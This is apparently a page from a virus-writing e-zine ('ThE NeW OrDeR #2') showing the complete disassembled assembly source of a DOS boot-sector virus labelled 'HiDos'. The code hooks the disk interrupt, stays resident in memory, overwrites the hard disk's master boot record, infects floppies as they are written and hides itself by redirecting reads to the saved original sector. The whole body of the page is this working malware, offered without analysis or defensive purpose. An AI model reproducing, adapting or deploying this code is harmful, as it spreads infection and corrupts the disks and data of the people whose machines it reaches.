<html>

<head>
<meta http-equiv="Content-Type"
content="text/html; charset=windows-1251">
<meta name="GENERATOR" content="Microsoft FrontPage Express 2.0">
<title>ThE NeW OrDeR #2</title>
</head>

<body bgcolor="#000000" link="#0000FF" vlink="#000080"
bgproperties="fixed" topmargin="15" leftmargin="20" "
vlink="#000080">

<p align="center"><img src="../Images/viruz.gif" width="560"
height="100"></p>

<p align="center"><font color="#FF0000" size="5"><strong><img
src="../images/Rs.jpg" width="640" height="12"></strong></font></p>

<p align="center"><font color="#FF0000" size="5"><strong><img
src="../Images/fogskul.gif" alt="OneHalf  Virii" width="160"
height="100"></strong></font></p>

<p align="center"><font color="#FF0000" size="6"><strong>HACKTIC
2</strong></font></p>

<p align="left"><font color="#00FFFF"><strong>;
--------------------------------------------------------------------------<br>
; Disassembled by FairWind / NRG , nrgteam@mail.ru<br>
;
--------------------------------------------------------------------------</strong></font></p>

<p align="left"><font color="#FFFFFF"><strong>NAME boot<br>
PAGE 55,132<br>
TITLE FILE UTIL<br>
<br>
<br>
<br>
<br>
code segment<br>
<br>
ASSUME CS:CODE,DS:CODE,ES:CODE<br>
<br>
org 100h<br>
<br>
main: jmp over<br>
db '['<br>
id db 'HiDos]',0<br>
by db 'By Apache',0<br>
over: xor ax,ax<br>
mov ds,ax<br>
cli<br>
mov ss,ax<br>
mov sp,7c00h<br>
sti<br>
mov ax,ds:[004eh]<br>
mov word ptr ds:[int13+7b02h],ax<br>
mov ax,ds:[004ch]<br>
mov word ptr ds:[int13+7b00h],ax<br>
mov ax,ds:[0413h]<br>
dec ax<br>
dec ax<br>
mov ds:[0413h],ax<br>
mov cl,06h<br>
shl ax,cl<br>
mov es,ax<br>
mov word ptr ds:[bigj+7b02h],es<br>
mov ax,offset jumpt<br>
mov word ptr ds:[bigj+7b00h],ax<br>
mov cx,0400h<br>
push cs<br>
pop ds<br>
mov si,7c00h<br>
mov di,0100h<br>
cld<br>
repz<br>
movsb<br>
push cs<br>
pop ds<br>
jmp cs:[bigj+7b00h]<br>
<br>
jumpt: push cs<br>
pop ds<br>
mov si,offset drive<br>
cmp byte ptr ds:[si],80h<br>
jz hdone<br>
mov bx,0300h<br>
mov cx,0001h<br>
mov dx,0080h<br>
push cs<br>
pop es<br>
call hdread<br>
cmp ds:[0304h],'iH'<br>
jz hdone<br>
mov bx,0300h<br>
mov cx,0007h<br>
mov dx,0080h<br>
call hdwrit<br>
mov si,04beh<br>
mov di,02beh<br>
mov cx,0042h<br>
cld<br>
repz<br>
movsb<br>
mov byte ptr ds:[drive],80h<br>
mov bx,0100h<br>
mov cx,0001h<br>
mov dx,0080h<br>
call hdwrit<br>
mov byte ptr ds:[drive],00h<br>
<br>
hdone: xor ax,ax<br>
mov word ptr cs:[boot+2],ax<br>
mov es,ax<br>
push cs<br>
pop ds<br>
mov ax,0201h<br>
mov bx,7c00h<br>
mov word ptr ds:[boot],bx<br>
mov si,offset drive<br>
cmp byte ptr ds:[si],80h<br>
jz hload<br>
mov cx,0003h<br>
mov dx,0100h<br>
jmp fload<br>
hload: mov cx,0007h<br>
mov dx,0080h<br>
fload: mov di,'rv'<br>
int 13h<br>
mov si,offset drive<br>
mov byte ptr cs:[si],00h<br>
xor ax,ax<br>
mov es,ax<br>
mov ds,ax<br>
mov ax,offset nint13<br>
mov ds:[004ch],ax<br>
mov ds:[004eh],cs<br>
push cs<br>
pop ds<br>
jmp cs:[boot]<br>
<br>
hdwrit: mov ax,0301h<br>
mov di,'rv'<br>
jmp xx4<br>
hdread: mov ax,0201h<br>
mov di,'rv'<br>
xx4: int 13h<br>
ret<br>
<br>
nint13: cmp di,'rv'<br>
jz iv13<br>
cmp ah,02h<br>
jnz wcheck<br>
cmp cl,01h<br>
jnz wcheck<br>
cmp dh,00h<br>
jnz wcheck<br>
cmp dl,80h<br>
jz check1<br>
cmp dl,00h<br>
jnz wcheck<br>
check1: push ax<br>
push bx<br>
push cx<br>
push dx<br>
push ds<br>
push es<br>
push di<br>
mov bx,0300h<br>
push cs<br>
pop es<br>
call hdread<br>
mov si,offset [id+0200h]<br>
cmp es:[si],'iH'<br>
jz redirect<br>
jmp iflopd<br>
redirect: cmp dl,80h<br>
jnz rdirfl<br>
pop di<br>
pop es<br>
pop ds<br>
pop dx<br>
pop cx<br>
pop bx<br>
pop ax<br>
mov cx,0007h<br>
jmp a13<br>
<br>
rdirfl: pop di<br>
pop es<br>
pop ds<br>
pop dx<br>
pop cx<br>
pop bx<br>
pop ax<br>
mov cx,0003h<br>
mov dx,0100h<br>
a13: mov ax,0201h<br>
iv13: jmp v13<br>
<br>
<br>
wcheck: cmp ah,03h<br>
jnz v13<br>
cmp dl,00h<br>
jnz v13<br>
push ax<br>
push bx<br>
push cx<br>
push dx<br>
push ds<br>
push es<br>
push di<br>
push cs<br>
pop es<br>
mov bx,0300h<br>
mov cx,0001h<br>
xor dx,dx<br>
call hdread<br>
mov si,offset [id+0200h]<br>
cmp es:[si],'iH'<br>
jz iflopd<br>
mov cx,0003h<br>
mov dx,0100h<br>
mov bx,0300h<br>
call hdwrit<br>
mov bx,0100h<br>
xor dx,dx<br>
mov cx,0001h<br>
call hdwrit<br>
iflopd: pop di<br>
pop es<br>
pop ds<br>
pop dx<br>
pop cx<br>
pop bx<br>
pop ax<br>
v13: db 0eah<br>
int13 dd 0h<br>
drive db 0h<br>
bigj dd 0h<br>
boot dd 0h<br>
<br>
code ends<br>
<br>
end main</strong></font></p>

<p align="center"><a href="../TNO#2_start.htm"><img
src="../images/14ic3.gif" border="0" width="60" height="65"></a></p>

<p align="center"><a href="mailto:nrgteam@mail.ru"><img
src="../images/coollogo_com_7565375.jpg" border="0" width="206"
height="53"></a></p>
</body>
</html>
